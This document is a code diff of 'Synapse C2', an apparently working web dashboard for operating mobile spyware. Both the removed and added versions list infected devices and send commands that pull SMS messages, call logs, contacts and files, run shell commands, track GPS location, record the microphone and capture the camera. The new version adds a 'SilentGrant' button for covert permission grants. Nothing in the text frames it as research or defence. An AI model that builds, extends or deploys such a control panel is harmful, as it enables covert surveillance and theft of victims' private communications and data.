@@ -3,550 +3,126 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-<meta http-equiv="Pragma" content="no-cache">
-<meta http-equiv="Expires" content="0">
-<title>Synapse C2 — Dashboard</title>
+<title>Synapse C2</title>
 <style>
-/* ============================================================
-   SYNAPSE C2 — SIMPLE BULLETPROOF DARK DASHBOARD
-   ============================================================ */
 *{margin:0;padding:0;box-sizing:border-box}
-:root{
-  --bg:#080c12; --bg2:#0e1520; --bg3:#151d2a; --bg4:#1c2736;
-  --border:#1e2d3d; --text:#c0ccd8; --dim:#546478;
-  --accent:#4da6ff; --green:#3cc95b; --red:#f85149;
-  --orange:#f0883e; --yellow:#e2b93b; --cyan:#39c5cf;
-  --purple:#c061cb; --teal:#1dd1a1; --code:#7ee787;
-  --font:'Inter','Segoe UI',system-ui,sans-serif;
-  --mono:'JetBrains Mono','Fira Code','Cascadia Code',monospace;
-}
-html,body{height:100%;overflow:hidden}
-body{font-family:var(--font);background:var(--bg);color:var(--text);font-size:13px;line-height:1.5}
-
-/* HEADER */
-.header{background:var(--bg2);border-bottom:1px solid var(--border);padding:0 16px;height:44px;display:flex;align-items:center;gap:10px;flex-shrink:0}
-.header .logo{font-size:15px;font-weight:800;color:var(--accent);letter-spacing:-0.3px}
-.header .status{margin-left:auto;font-size:10px;color:var(--dim);display:flex;align-items:center;gap:6px}
-.header .dot{width:7px;height:7px;border-radius:50%}
-.header .dot.green{background:var(--green);box-shadow:0 0 6px var(--green)}
-.header .dot.red{background:var(--red)}
-.header .dot.yellow{background:var(--yellow)}
-
-/* MAIN LAYOUT */
-.layout{display:flex;height:calc(100vh - 44px);overflow:hidden}
-
-/* SIDEBAR */
-.sidebar{width:280px;min-width:280px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
-.sidebar-header{padding:10px 12px;border-bottom:1px solid var(--border);font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:1px;display:flex;align-items:center;gap:6px}
-.sidebar-header .count{color:var(--accent);font-size:11px}
-.device-list{flex:1;overflow-y:auto;padding:4px}
-.device-card{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:7px 9px;margin:3px 0;cursor:pointer;transition:all 0.12s}
-.device-card:hover{border-color:var(--accent)}
-.device-card.selected{border-color:var(--accent);background:#101d2e;box-shadow:0 0 10px rgba(77,166,255,0.08)}
-.device-card .dev-row{display:flex;align-items:center;gap:6px;margin-bottom:2px}
-.device-card .status-dot{width:6px;height:6px;border-radius:50%;flex-shrink:0}
-.device-card .status-dot.online{background:var(--green);box-shadow:0 0 5px var(--green)}
-.device-card .status-dot.offline{background:var(--red)}
-.device-card .dev-id{font-size:10px;font-weight:600;color:var(--accent);font-family:var(--mono);word-break:break-all;line-height:1.2}
-.device-card .dev-meta{font-size:9px;color:var(--dim)}
-.device-card .dev-meta span{color:var(--text)}
-.info-panel{padding:8px 10px;border-top:1px solid var(--border);display:none}
-.info-panel.visible{display:block}
-.info-panel .info-row{display:flex;padding:1px 0;font-size:9px}
-.info-panel .info-label{color:var(--dim);width:60px;flex-shrink:0}
-.info-panel .info-value{color:var(--text);word-break:break-all;font-family:var(--mono);font-size:9px}
-.stats-row{border-top:1px solid var(--border);padding:6px 10px;display:flex;gap:10px;font-size:9px}
-.stats-row .stat{color:var(--dim)}
-.stats-row .stat b{color:var(--accent)}
-
-/* MAIN */
-.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
-
-/* TOOLBAR */
-.toolbar{background:var(--bg2);border-bottom:1px solid var(--border);padding:6px 10px;display:flex;gap:4px;flex-wrap:wrap;flex-shrink:0}
-.toolbar button{padding:4px 10px;border-radius:3px;border:1px solid var(--border);background:var(--bg3);color:var(--text);font-size:10px;cursor:pointer;transition:all 0.12s;font-family:var(--font);font-weight:500;white-space:nowrap}
-.toolbar button:hover{border-color:var(--accent);color:var(--accent)}
-.toolbar button:disabled{opacity:0.35;cursor:not-allowed;pointer-events:none}
-.toolbar .sep{width:1px;background:var(--border);margin:0 4px;align-self:stretch}
-
-/* RESULT PANEL */
-.result-panel{flex:1;display:flex;flex-direction:column;overflow:hidden}
-.result-header{background:var(--bg2);border-bottom:1px solid var(--border);padding:4px 12px;font-size:10px;color:var(--dim);display:flex;align-items:center;gap:8px;flex-shrink:0}
-.result-header .result-label{color:var(--accent);font-weight:600}
-.result-area{flex:1;overflow:auto;padding:12px;background:var(--bg);font-family:var(--mono);font-size:11px;color:var(--code);white-space:pre-wrap;word-break:break-word;line-height:1.6}
-.result-area .empty{color:var(--dim);font-family:var(--font);font-size:12px;text-align:center;padding:60px 20px}
-.result-area .error-block{color:var(--red)}
-.result-area .key{color:var(--accent)}
-.result-area .val-str{color:var(--orange)}
-.result-area .val-num{color:var(--cyan)}
-.result-area .val-bool{color:var(--purple)}
-.result-area .null{color:var(--dim)}
-
-/* SMS pretty print */
-.sms-item{padding:6px 0;border-bottom:1px solid rgba(30,45,61,0.5)}
-.sms-item .sms-sender{color:var(--accent);font-weight:600;font-size:11px}
-.sms-item .sms-body{color:var(--text);font-size:11px;margin-top:2px}
-.sms-item .sms-meta{color:var(--dim);font-size:9px;margin-top:1px}
-
-/* File pretty print */
-.file-item{padding:4px 0;display:flex;justify-content:space-between;font-size:10px}
-.file-item .file-name{color:var(--accent)}
-.file-item .file-size{color:var(--dim)}
-.file-item .file-date{color:var(--dim)}
-.file-item.isfile{border-bottom:1px solid rgba(30,45,61,0.3)}
-.file-item.isdir{color:var(--yellow)}
-
-/* ========== SCROLLBAR ========== */
-::-webkit-scrollbar{width:5px;height:5px}
-::-webkit-scrollbar-track{background:var(--bg)}
-::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
-::-webkit-scrollbar-thumb:hover{background:var(--dim)}
-
-/* TOAST */
-.toast-container{position:fixed;bottom:14px;right:14px;z-index:9999;display:flex;flex-direction:column;gap:5px}
-.toast{background:var(--bg3);border:1px solid var(--accent);color:var(--text);padding:7px 14px;border-radius:4px;font-size:10px;animation:slideIn 0.25s ease;max-width:320px;word-break:break-word}
-.toast.error{border-color:var(--red)}
-.toast.success{border-color:var(--green)}
-@keyframes slideIn{from{transform:translateX(30px);opacity:0}to{transform:translateX(0);opacity:1}}
+body{font-family:monospace;background:#0a0e14;color:#c8d6e5;display:flex;height:100vh}
+#sidebar{width:300px;background:#111820;padding:15px;overflow-y:auto;border-right:1px solid #1e2a3a}
+#main{flex:1;padding:15px;display:flex;flex-direction:column;gap:10px}
+h2{font-size:14px;color:#5a6e82;margin-bottom:8px}
+.device{border:1px solid #1e2a3a;padding:10px;margin-bottom:6px;border-radius:4px;cursor:pointer}
+.device:hover{border-color:#4da6ff}
+.device.sel{border-color:#4da6ff;background:#141f2e}
+.dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px}
+.on{background:#3cc95b;box-shadow:0 0 6px #3cc95b}
+.off{background:#f85149}
+.id{font-size:12px;color:#4da6ff;word-break:break-all}
+.info{font-size:11px;color:#5a6e82;margin-top:3px}
+.btn{background:#1a3a1a;border:1px solid #2ea043;color:#fff;padding:6px 14px;border-radius:4px;cursor:pointer;font-size:12px;font-family:monospace;margin:2px}
+.btn:hover{background:#2ea043}
+.btn:disabled{opacity:0.3;cursor:not-allowed}
+#output{flex:1;background:#0d1117;border:1px solid #1e2a3a;border-radius:4px;padding:10px;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-word}
+#toolbar{display:flex;flex-wrap:wrap;gap:4px}
+.sep{width:1px;background:#1e2a3a;margin:0 5px}
+.stat{font-size:11px;color:#5a6e82;margin-bottom:6px}
 </style>
 </head>
 <body>
-
-<!-- HEADER -->
-<div class="header">
-  <div class="logo">Synapse C2</div>
-  <div class="status"><span class="dot yellow" id="sse-dot"></span><span id="sse-label">Connecting...</span></div>
+<div id="sidebar">
+  <h2>↯ DEVICES <span id="devcount">(0)</span></h2>
+  <div id="devlist">Connecting...</div>
 </div>
-
-<!-- LAYOUT -->
-<div class="layout">
-  <!-- SIDEBAR -->
-  <div class="sidebar" id="sidebar">
-    <div class="sidebar-header">Devices <span class="count" id="dev-count">(0)</span></div>
-    <div class="device-list" id="device-list">
-      <div style="color:var(--dim);text-align:center;padding:24px;font-size:11px">No devices connected</div>
-    </div>
-    <div class="info-panel" id="info-panel">
-      <div class="info-row"><span class="info-label">Status:</span><span class="info-value" id="inf-status">—</span></div>
-      <div class="info-row"><span class="info-label">Model:</span><span class="info-value" id="inf-model">—</span></div>
-      <div class="info-row"><span class="info-label">Brand:</span><span class="info-value" id="inf-brand">—</span></div>
-      <div class="info-row"><span class="info-label">SDK:</span><span class="info-value" id="inf-sdk">—</span></div>
-      <div class="info-row"><span class="info-label">OS:</span><span class="info-value" id="inf-os">—</span></div>
-      <div class="info-row"><span class="info-label">Seen:</span><span class="info-value" id="inf-seen">—</span></div>
-    </div>
-    <div class="stats-row">
-      <span class="stat">Online: <b id="st-online">0</b></span>
-      <span class="stat">Offline: <b id="st-offline">0</b></span>
-      <span class="stat">Results: <b id="st-results">0</b></span>
-    </div>
+<div id="main">
+  <div id="toolbar">
+    <button class="btn" onclick="cmd('ping','ping')">Ping</button>
+    <button class="btn" onclick="cmd('info','gather')">Info</button>
+    <button class="btn" onclick="cmd('sms','list','{\"count\":\"10\"}')">SMS</button>
+    <button class="btn" onclick="cmd('calls','list','{\"count\":\"20\"}')">Calls</button>
+    <button class="btn" onclick="cmd('contacts','list')">Contacts</button>
+    <button class="btn" onclick="cmd('files','list','{\"type\":\"images\",\"count\":\"20\"}')">Files</button>
+    <button class="btn" onclick="cmd('shell','exec','{\"cmd\":\"id\"}')">Shell</button>
+    <button class="btn" onclick="cmd('location','get')">GPS</button>
+    <button class="btn" onclick="cmd('mic','record','{\"duration\":\"10\"}')">Mic</button>
+    <button class="btn" onclick="cmd('camera','capture')">Camera</button>
+    <button class="btn" onclick="cmd('silent_grant','grant')">SilentGrant</button>
   </div>
-
-  <!-- MAIN -->
-  <div class="main">
-    <!-- TOOLBAR -->
-    <div class="toolbar" id="toolbar">
-      <button onclick="sendQuickCommand('ping','ping')" id="btn-ping">Ping</button>
-      <button onclick="sendQuickCommand('info','gather')" id="btn-info">Device Info</button>
-      <span class="sep"></span>
-      <button onclick="sendQuickCommand('sms','list')" id="btn-sms">SMS List</button>
-      <button onclick="sendQuickCommand('calls','list')" id="btn-calls">Call Log</button>
-      <button onclick="sendQuickCommand('contacts','list')" id="btn-contacts">Contacts</button>
-      <span class="sep"></span>
-      <button onclick="sendQuickCommand('files','list')" id="btn-files">Files</button>
-      <span class="sep"></span>
-      <button onclick="sendQuickCommand('shell','exec')" id="btn-shell">Shell (id)</button>
-      <button onclick="sendQuickCommand('location','get')" id="btn-location">Location</button>
-      <button onclick="sendQuickCommand('mic','record','{\"duration\":10}')" id="btn-mic">Mic 10s</button>
-      <button onclick="sendQuickCommand('camera','capture')" id="btn-camera">Camera</button>
-    </div>
-
-    <!-- RESULT PANEL -->
-    <div class="result-panel">
-      <div class="result-header">
-        <span class="result-label" id="result-label">Results</span>
-        <span style="font-size:9px" id="result-cmd">—</span>
-      </div>
-      <div class="result-area" id="result-area">
-        <div class="empty">Awaiting results via SSE — select a device and click a button above</div>
-      </div>
-    </div>
-  </div>
+  <div id="output">Waiting for commands...</div>
 </div>
-
-<!-- TOAST -->
-<div class="toast-container" id="toast-container"></div>
 
 <script>
-// ============================================================
-// SYNAPSE C2 — BULLETPROOF SINGLE-PAGE DASHBOARD
-// One global variable. No duplicates. All functions defined before use.
-// ============================================================
+var activeId = '';
+var deviceData = {};
 
-// --- STATE (single source of truth) ---
-var activeDeviceId = null;
-var devicesCache = {};
-var resultCount = 0;
-var lastResult = null;
-
-// --- CONSTANTS ---
-var API_BASE = window.location.origin;
-
-// ================================================================
-// TOAST NOTIFICATIONS
-// ================================================================
-function showToast(msg, type) {
-    var container = document.getElementById('toast-container');
-    var t = document.createElement('div');
-    t.className = 'toast ' + (type || '');
-    t.textContent = msg;
-    container.appendChild(t);
-    setTimeout(function() { t.remove(); }, 3000);
-}
-
-// ================================================================
-// DEVICE FETCHING & RENDERING
-// ================================================================
-function fetchDevices() {
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', API_BASE + '/api/devices', true);
-    xhr.onload = function() {
-        if (xhr.status !== 200) return;
-        try {
-            var data = JSON.parse(xhr.responseText);
-            devicesCache = {};
-            var online = 0, offline = 0;
-            (data.devices || []).forEach(function(d) {
-                devicesCache[d.device_id] = d;
-                if (d.online) online++; else offline++;
-            });
-            document.getElementById('st-online').textContent = online;
-            document.getElementById('st-offline').textContent = offline;
-            document.getElementById('dev-count').textContent = '(' + (data.count || 0) + ')';
-            renderDeviceList();
-            autoSelectDevice();
-        } catch(e) {}
-    };
-    xhr.send();
-}
-
-function renderDeviceList() {
-    var list = document.getElementById('device-list');
-    var ids = Object.keys(devicesCache);
-    if (ids.length === 0) {
-        list.innerHTML = '<div style="color:var(--dim);text-align:center;padding:24px;font-size:11px">No devices</div>';
-        return;
+async function fetchDevs(){
+  try{
+    var r = await fetch('/api/devices');
+    var d = await r.json();
+    deviceData = {};
+    (d.devices||[]).forEach(function(x){deviceData[x.id]=x;});
+    renderSidebar();
+    if(!activeId || !deviceData[activeId] || !deviceData[activeId].online){
+      // auto-select first online
+      for(var k in deviceData){
+        if(deviceData[k].online){ activeId = k; break; }
+      }
     }
-    var html = '';
-    ids.forEach(function(id) {
-        var d = devicesCache[id];
-        var sel = (activeDeviceId === id) ? ' selected' : '';
-        var dot = d.online ? 'online' : 'offline';
-        var shortId = id.length > 18 ? id.substring(0, 14) + '...' : id;
-        html += '<div class="device-card' + sel + '" onclick="selectDevice(\'' + id + '\')">' +
-            '<div class="dev-row">' +
-            '<span class="status-dot ' + dot + '"></span>' +
-            '<span class="dev-id">' + shortId + '</span>' +
-            '</div>' +
-            '<div class="dev-meta">' + (d.model || 'Unknown') + ' <span>' + (d.online ? 'Online' : 'Offline') + '</span></div>' +
-            '</div>';
+    renderSidebar();
+  }catch(e){}
+}
+
+function renderSidebar(){
+  document.getElementById('devcount').textContent = '('+Object.keys(deviceData).length+')';
+  var html = '';
+  for(var k in deviceData){
+    var d = deviceData[k];
+    html += '<div class="device'+(k===activeId?' sel':'')+'" onclick="select(\''+k+'\')">';
+    html += '<span class="dot '+(d.online?'on':'off')+'"></span>';
+    html += '<span class="id">'+k.substring(0,16)+'...</span>';
+    html += '<div class="info">'+(d.info.model||'?')+' | SDK '+(d.info.os_version||'?')+' | '+(d.online?'Online':'Offline')+'</div>';
+    html += '</div>';
+  }
+  document.getElementById('devlist').innerHTML = html || 'No devices';
+  // disable buttons if no device selected
+  var btns = document.querySelectorAll('.btn');
+  for(var i=0;i<btns.length;i++) btns[i].disabled = !activeId;
+}
+
+function select(id){ activeId = id; renderSidebar(); }
+
+async function cmd(mod, act, params){
+  if(!activeId){ alert('No device selected'); return; }
+  var p = {};
+  if(params) try{p = JSON.parse(params);}catch(e){alert('Bad params');return;}
+  document.getElementById('output').textContent = 'Sending '+mod+'/'+act+'...';
+  try{
+    var r = await fetch('/api/command',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({device_id:activeId, module:mod, action:act, params:p})
     });
-    list.innerHTML = html;
+    var d = await r.json();
+    document.getElementById('output').textContent = 'Queued: '+mod+'/'+act+' ['+(d.command_id||'?')+']\n\nWaiting for result...';
+  }catch(e){
+    document.getElementById('output').textContent = 'Error: '+e.message;
+  }
 }
 
-// ================================================================
-// DEVICE SELECTION
-// ================================================================
-function selectDevice(id) {
-    // Clicking the same device does NOT deselect — sticky selection
-    activeDeviceId = id;
-    renderDeviceList();
-    updateInfoPanel();
-    updateButtons();
+// SSE for results
+function sse(){
+  var es = new EventSource('/api/events');
+  es.onmessage = function(e){
+    try{
+      var r = JSON.parse(e.data);
+      if(!r.data) return;
+      document.getElementById('output').textContent = r.data;
+    }catch(ex){}
+  };
+  es.onerror = function(){ setTimeout(sse,2000); };
 }
 
-function autoSelectDevice() {
-    // If current selection is still valid and online, keep it
-    if (activeDeviceId && devicesCache[activeDeviceId] && devicesCache[activeDeviceId].online) {
-        updateInfoPanel();
-        updateButtons();
-        return;
-    }
-    // Auto-select the first online device
-    var ids = Object.keys(devicesCache);
-    for (var i = 0; i < ids.length; i++) {
-        var d = devicesCache[ids[i]];
-        if (d.online) {
-            activeDeviceId = ids[i];
-            renderDeviceList();
-            updateInfoPanel();
-            updateButtons();
-            return;
-        }
-    }
-    // No online device — if there's any device, select it
-    if (ids.length > 0 && !activeDeviceId) {
-        activeDeviceId = ids[0];
-        renderDeviceList();
-        updateInfoPanel();
-        updateButtons();
-    }
-}
-
-// ================================================================
-// INFO PANEL
-// ================================================================
-function updateInfoPanel() {
-    var panel = document.getElementById('info-panel');
-    if (!activeDeviceId || !devicesCache[activeDeviceId]) {
-        panel.classList.remove('visible');
-        return;
-    }
-    panel.classList.add('visible');
-    var d = devicesCache[activeDeviceId];
-    document.getElementById('inf-status').innerHTML = d.online
-        ? '<span style="color:var(--green)">Online</span>'
-        : '<span style="color:var(--red)">Offline</span>';
-    document.getElementById('inf-model').textContent = d.model || 'N/A';
-    document.getElementById('inf-brand').textContent = d.brand || 'N/A';
-    document.getElementById('inf-sdk').textContent = d.sdk || 'N/A';
-    document.getElementById('inf-os').textContent = d.release || d.os_version || 'N/A';
-    document.getElementById('inf-seen').textContent = d.last_seen || 'N/A';
-}
-
-// ================================================================
-// BUTTON STATE
-// ================================================================
-function updateButtons() {
-    var online = activeDeviceId && devicesCache[activeDeviceId] && devicesCache[activeDeviceId].online;
-    var ids = [
-        'btn-ping','btn-info','btn-sms','btn-calls','btn-contacts',
-        'btn-files','btn-shell','btn-location','btn-mic','btn-camera'
-    ];
-    ids.forEach(function(id) {
-        var el = document.getElementById(id);
-        if (el) el.disabled = !online;
-    });
-}
-
-// ================================================================
-// SEND COMMANDS
-// ================================================================
-function sendQuickCommand(module, action, paramsJson) {
-    if (!activeDeviceId) {
-        showToast('No device selected', 'error');
-        return;
-    }
-    if (!devicesCache[activeDeviceId] || !devicesCache[activeDeviceId].online) {
-        showToast('Selected device is offline', 'error');
-        return;
-    }
-
-    var params = {};
-    if (paramsJson) {
-        try { params = JSON.parse(paramsJson); } catch(e) {
-            showToast('Invalid params JSON', 'error');
-            return;
-        }
-    }
-
-    var payload = JSON.stringify({
-        device_id: activeDeviceId,
-        module: module,
-        action: action,
-        params: params
-    });
-
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', API_BASE + '/api/command', true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.onload = function() {
-        try {
-            var resp = JSON.parse(xhr.responseText);
-            if (resp.error) {
-                showToast(resp.error, 'error');
-            } else {
-                showToast('Sent: ' + module + '/' + action + ' [' + (resp.command_id || '').substring(0,8) + '...]', 'success');
-            }
-        } catch(e) {
-            showToast('Command sent', 'success');
-        }
-    };
-    xhr.onerror = function() {
-        showToast('Failed to send command', 'error');
-    };
-    xhr.send(payload);
-
-    // Update result header
-    document.getElementById('result-label').textContent = module + '/' + action;
-    document.getElementById('result-cmd').textContent = 'sent to ' + activeDeviceId.substring(0, 12) + '...';
-}
-
-// ================================================================
-// RESULT RENDERING
-// ================================================================
-function renderResult(result) {
-    var area = document.getElementById('result-area');
-
-    // Try to parse the data field as JSON for pretty-printing
-    var parsed = null;
-    var rawData = result.data || '';
-
-    if (rawData) {
-        try {
-            parsed = JSON.parse(rawData);
-        } catch(e) {
-            // Not JSON, display as plain text
-        }
-    }
-
-    var html = '';
-    var mod = result.module || '';
-    var act = result.action || '';
-
-    // --- Decide how to render based on module/action ---
-    if (mod === 'sms' && parsed && parsed.messages && Array.isArray(parsed.messages)) {
-        html += '<div style="padding:4px 0"><strong style="color:var(--teal)">SMS Messages (' + parsed.messages.length + ')</strong></div>';
-        parsed.messages.forEach(function(m) {
-            html += '<div class="sms-item">' +
-                '<div class="sms-sender">' + (m.address || 'Unknown') + '</div>' +
-                '<div class="sms-body">' + (m.body || '(empty)') + '</div>' +
-                '<div class="sms-meta">' + (m.type || '') + ' | ' + (m.date ? new Date(m.date).toLocaleString() : '') + '</div>' +
-                '</div>';
-        });
-    } else if (mod === 'calls' && parsed && parsed.calls && Array.isArray(parsed.calls)) {
-        html += '<div style="padding:4px 0"><strong style="color:var(--pink)">Call Log (' + parsed.calls.length + ')</strong></div>';
-        parsed.calls.forEach(function(c) {
-            html += '<div class="sms-item">' +
-                '<div class="sms-sender">' + (c.number || 'Unknown') + ' <span style="color:var(--dim)">[' + (c.type || '') + ']</span></div>' +
-                '<div class="sms-meta">' + (c.date ? new Date(c.date).toLocaleString() : '') + ' | ' + (c.duration || 0) + 's</div>' +
-                '</div>';
-        });
-    } else if (mod === 'contacts' && parsed && parsed.contacts && Array.isArray(parsed.contacts)) {
-        html += '<div style="padding:4px 0"><strong style="color:var(--purple)">Contacts (' + parsed.contacts.length + ')</strong></div>';
-        parsed.contacts.forEach(function(c) {
-            html += '<div class="sms-item">' +
-                '<div class="sms-sender">' + (c.display_name || 'Unknown') + '</div>' +
-                '<div class="sms-meta">' + (c.phone_numbers || []).join(', ') + '</div>' +
-                '</div>';
-        });
-    } else if (mod === 'files' && parsed && parsed.entries && Array.isArray(parsed.entries)) {
-        html += '<div style="padding:4px 0"><strong style="color:var(--orange)">Files (' + parsed.entries.length + ')</strong></div>';
-        parsed.entries.forEach(function(f) {
-            var icon = f.is_directory ? 'dir' : 'file';
-            var cls = f.is_directory ? 'isdir' : 'isfile';
-            html += '<div class="file-item ' + cls + '">' +
-                '<span class="file-name">' + (f.is_directory ? '📁 ' : '📄 ') + (f.name || '') + '</span>' +
-                '<span class="file-size">' + (f.size || '') + '</span>' +
-                '<span class="file-date">' + (f.modified || '') + '</span>' +
-                '</div>';
-        });
-    } else if (mod === 'shell' && act === 'exec' && parsed) {
-        html += '<div style="padding:4px 0"><strong style="color:var(--yellow)">Shell Output</strong></div>';
-        if (parsed.stdout) {
-            html += '<div style="color:var(--code)">' + escapeHtml(parsed.stdout) + '</div>';
-        }
-        if (parsed.stderr) {
-            html += '<div style="color:var(--red)">' + escapeHtml(parsed.stderr) + '</div>';
-        }
-        if (parsed.exit_code !== undefined) {
-            html += '<div style="color:var(--dim);font-size:10px;margin-top:4px">Exit: ' + parsed.exit_code + '</div>';
-        }
-    } else if (mod === 'camera' && parsed && parsed.image_base64) {
-        html += '<strong style="color:var(--purple)">Camera Capture</strong><br>';
-        html += '<img src="data:image/jpeg;base64,' + parsed.image_base64 + '" style="max-width:100%;max-height:400px;border-radius:4px;margin:8px 0">';
-    } else if (parsed) {
-        // Generic parsed JSON — pretty print
-        html += '<strong>' + mod + '/' + act + '</strong><br>';
-        html += syntaxHighlight(JSON.stringify(parsed, null, 2));
-    } else if (rawData) {
-        // Plain text result
-        html += '<strong>' + mod + '/' + act + '</strong><br>';
-        html += escapeHtml(rawData);
-    } else {
-        html += '<span style="color:var(--dim)">No data in result</span>';
-    }
-
-    area.innerHTML = html;
-    document.getElementById('result-label').textContent = mod + '/' + act;
-    document.getElementById('result-cmd').textContent = 'from ' + (result.device_id || '').substring(0, 12) + '... at ' + (result.time || '');
-}
-
-// --- Helpers ---
-function escapeHtml(text) {
-    return String(text)
-        .replace(/&/g, '&amp;')
-        .replace(/</g, '&lt;')
-        .replace(/>/g, '&gt;')
-        .replace(/"/g, '&quot;')
-        .replace(/'/g, '&#039;');
-}
-
-function syntaxHighlight(json) {
-    json = json.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-    return json.replace(/("(\\u[a-fA-F0-9]{4}|\\[^u]|[^"\\])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g, function(match) {
-        var cls = 'val-num';
-        if (/^"/.test(match)) {
-            if (/:$/.test(match)) {
-                cls = 'key';
-            } else {
-                cls = 'val-str';
-            }
-        } else if (/true|false/.test(match)) {
-            cls = 'val-bool';
-        } else if (/null/.test(match)) {
-            cls = 'null';
-        }
-        return '<span class="' + cls + '">' + match + '</span>';
-    });
-}
-
-// ================================================================
-// SSE CONNECTION
-// ================================================================
-function connectSSE() {
-    var source = new EventSource(API_BASE + '/api/events');
-
-    source.onopen = function() {
-        document.getElementById('sse-dot').className = 'dot green';
-        document.getElementById('sse-label').textContent = 'SSE Connected';
-    };
-
-    source.onerror = function() {
-        document.getElementById('sse-dot').className = 'dot red';
-        document.getElementById('sse-label').textContent = 'SSE Disconnected';
-        source.close();
-        setTimeout(connectSSE, 3000);
-    };
-
-    source.onmessage = function(e) {
-        try {
-            var result = JSON.parse(e.data);
-            if (!result || !result.device_id) return;
-
-            resultCount++;
-            document.getElementById('st-results').textContent = resultCount;
-            lastResult = result;
-
-            // If this result is from the currently selected device, render it
-            if (activeDeviceId && result.device_id === activeDeviceId) {
-                renderResult(result);
-            }
-        } catch(ex) {
-            // silently ignore parse errors
-        }
-    };
-}
-
-// ================================================================
-// INITIALIZATION
-// ================================================================
-window.onload = function() {
-    fetchDevices();
-    connectSSE();
-    // Poll devices every 3 seconds
-    setInterval(fetchDevices, 3000);
-};
+fetchDevs();
+setInterval(fetchDevs,3000);
+sse();
 </script>
 </body>
 </html>
